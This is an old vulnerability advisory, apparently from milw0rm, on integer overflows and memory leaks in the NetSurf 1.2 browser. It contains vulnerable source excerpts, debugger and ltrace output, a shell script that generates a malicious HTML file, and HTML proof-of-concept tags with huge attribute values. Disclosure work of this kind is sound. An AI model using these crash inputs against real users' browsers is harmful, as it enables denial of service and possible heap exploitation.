@@ -1,0 +1,202 @@
+--------------------------------------------------------------------------------------------------------------------------------------------
+
+[Jeremy Brown 01-14-2009]
+0xjbrown41@gmail.com/jbrownsec.blogspot.com
+netsurf_multiple_adv.txt
+--------------------------------------------------------------------------------------------------------------------------------------------
+
+NetSurf Web Browser 1.2
+http://www.netsurf-browser.org
+Debian, Ubuntu, etc packages, or source code available @ http://www.netsurf-browser.org/downloads/releases/netsurf-1.2-src.tar.gz
+
+Several bugs, including integer overflows and memory leaks, have been found in the NetSurf web browser. At one point in the research,
+I was able to overwrite the ESI register with my own data which could lead to heap based exploitation of at least [Problem #2] of the bugs.
+I was able to pass large values to several html tag attributes and make the program do huge malloc()'s. Some of the code seems to check for
+small numbers when parsing values then attempting to render content, but large numbers trigger integer overflows when allocating memory.
+
+--------------------------------------------------------------------------------------------------------------------------------------------
+
+{Problem #1]
+
+render/box_construct.c [1110-1136]:
+
+	if ((strcmp((const char *) n->name, "img") == 0) ||
+			(strcmp((const char *) n->name, "image") == 0) ||
+			(strcmp((const char *) n->name, "applet") == 0)) {
+		if ((s = (char *) xmlGetProp(n,
+				(const xmlChar *) "hspace"))) {
+			/* percentage hspace not implemented */
+			if (!strrchr(s, '%')) {
+				int value = isdigit(s[0]) ? atoi(s): -1;
+				if (0 <= value && !author->margin[LEFT]) {
+					style->margin[LEFT].margin =
+							CSS_MARGIN_LENGTH;
+					style->margin[LEFT].value.length.value =
+							value;
+					style->margin[LEFT].value.length.unit =
+							CSS_UNIT_PX;
+				}
+				if (0 <= value && !author->margin[RIGHT]) {
+					style->margin[RIGHT].margin =
+							CSS_MARGIN_LENGTH;
+					style->margin[RIGHT].value.length.
+							value = value;
+					style->margin[RIGHT].value.length.unit =
+							CSS_UNIT_PX;
+				}
+			}
+			xmlFree(s);
+		}
+
+(netsurf:31889): GdkPixbuf-CRITICAL **: gdk_pixbuf_scale: assertion `src != NULL' failed
+(netsurf:31889): GLib-GObject-CRITICAL **: g_object_unref: assertion `G_IS_OBJECT (object)' failed
+The program 'netsurf' received an X Window System error.
+This probably reflects a bug in the program.
+The error was 'BadAlloc (insufficient resources for operation)'.
+  (Details: serial 1071 error_code 11 request_code 53 minor_code 0)
+  (Note to programmers: normally, X errors are reported asynchronously;
+   that is, you will receive the error a while after causing it.
+   To debug your program, run it with the --sync command line
+   option to change this behavior. You can then get a meaningful
+   backtrace from your debugger if you break on the gdk_x_error() function.)
+
+Program exited with code 01.
+
+[ltrace log -- hspace = 30000, without --sync]
+
+gdk_gc_set_clip_rectangle(0x8cbdaf8, 0x80c4500, 0, 0, 0)
+                                                        = 0x8cbda01
+cairo_reset_clip(0xb6600948, 0x80c4500, 0, 0, 0)
+                                                        = 0
+cairo_rectangle(0xb6600948, 0, 0, 0, 0)
+                                                        = 0
+cairo_clip(0xb6600948, 0, 0, 0, 0)
+                                                        = 0xb6600aec
+gdk_gc_set_clip_rectangle(0x8cbdaf8, 0x80c4500, 0, 0, 0)
+                                                        = 0x8cbda01
+gdk_pixbuf_get_from_drawable(0, 0x8d0ed78, 0, 0, 0 <unfinished ...>
+malloc(3073536192) /// HUGE MALLOC
+                                                        = NULL
+<... gdk_pixbuf_get_from_drawable resumed> )
+                                                        = 0
+gdk_pixbuf_scale(0, 0x8c0e238, 0, 0, 100 <unfinished ...>
+free(0xb6600dc8)
+                                                        = <void>
+free(0xb6600de0)
+                                                        = <void>
+
+PoCs: <applet code='test.class' hspace='32767'>
+      <img src='test.jpg' hspace='32767'>
+
+--------------------------------------------------------------------------------------------------------------------------------------------
+
+[Problem #2]
+
+render/layout.c [526-539]:
+
+	/* add margins, border, padding to min, max widths */
+	calculate_mbp_width(block->style, LEFT, &extra_fixed, &extra_frac);
+	calculate_mbp_width(block->style, RIGHT, &extra_fixed, &extra_frac);
+	if (extra_fixed < 0)
+		extra_fixed = 0;
+	if (extra_frac < 0)
+		extra_frac = 0;
+	if (1.0 <= extra_frac)
+		extra_frac = 0.9;
+	block->min_width = (min + extra_fixed) / (1.0 - extra_frac);
+	block->max_width = (max + extra_fixed) / (1.0 - extra_frac);
+
+	assert(0 <= block->min_width && block->min_width <= block->max_width);
+}
+
+$ calc 32767*32767*2+131006
+	2147483584
+
+$ cat ns.sh ns2.sh
+echo "<iframe src='test.jpg' width='$1'>`perl -e 'print "A" x 99999999'`" > int.html
+echo "<iframe src='test.jpg' width='$1'>" > int.html
+$
+
+(gdb) shell ./ns.sh 2147483584
+(gdb) r file:///home/rush/Desktop/int.html
+
+[width = 2247483583 (2147483584+99999999) & 99,999,999 A's appended to test html file]
+
+Program received signal SIGABRT, Aborted.
+[Switching to Thread 0xb6d78720 (LWP 28933)]
+0xb804e430 in __kernel_vsyscall ()
+(gdb) i r
+eax            0x0	0
+ecx            0x7105	28933
+edx            0x6	6
+ebx            0x7105	28933
+esp            0xbfb4cfe4	0xbfb4cfe4
+ebp            0xbfb4cffc	0xbfb4cffc
+esi            0xb7532b97	-1219286121
+edi            0xb754fff4	-1219166220
+eip            0xb804e430	0xb804e430 <__kernel_vsyscall+16>
+eflags         0x206	[ PF IF ]
+cs             0x73	115
+ss             0x7b	123
+ds             0x7b	123
+es             0x7b	123
+fs             0x0	0
+gs             0x33	51
+(gdb) bt
+#0  0xb804e430 in __kernel_vsyscall ()
+#1  0xb7421880 in raise () from /lib/tls/i686/cmov/libc.so.6
+#2  0xb7423248 in abort () from /lib/tls/i686/cmov/libc.so.6
+#3  0xb741a72e in __assert_fail () from /lib/tls/i686/cmov/libc.so.6
+#4  0x080a7cdd in ?? ()
+#5  0x080a75e2 in ?? ()
+#6  0x080a747d in ?? ()
+#7  0x080ab3f0 in layout_document ()
+#8  0x0809f073 in html_reformat ()
+#9  0x080a0d95 in html_convert ()
+#10 0x0805980c in content_convert ()
+#11 0x0805cc49 in ?? ()
+#12 0x0805a6c1 in fetch_send_callback ()
+#13 0x08060c23 in ?? ()
+#14 0x0806110f in ?? ()
+#15 0x0805afe9 in fetch_poll ()
+#16 0x08088276 in gui_poll ()
+#17 0x0807fe94 in main ()
+
+PoCs: <iframe src='test.jpg' width='2147483584'>
+      <hr width='2147483584'>
+
+--------------------------------------------------------------------------------------------------------------------------------------------
+
+[Problem #3]
+
+Memory leak & huge system resource consumption.
+
+render/box_construct.c [1494-1514]:
+
+bool box_image(BOX_SPECIAL_PARAMS)
+{
+	bool ok;
+	char *s, *url;
+	xmlChar *alt, *src;
+
+	if (box->style && box->style->display == CSS_DISPLAY_NONE)
+		return true;
+
+	/* handle alt text */
+	if ((alt = xmlGetProp(n, (const xmlChar *) "alt"))) {
+		s = squash_whitespace((const char *) alt);
+		xmlFree(alt);
+		if (!s)
+			return false;
+		box->text = talloc_strdup(content, s);
+		free(s);
+		if (!box->text)
+			return false;
+		box->length = strlen(box->text);
+	}
+
+PoC: <img src='test.jpg' alt='"A" x ~2000'>
+
+--------------------------------------------------------------------------------------------------------------------------------------------
+
+# milw0rm.com [2009-01-14]
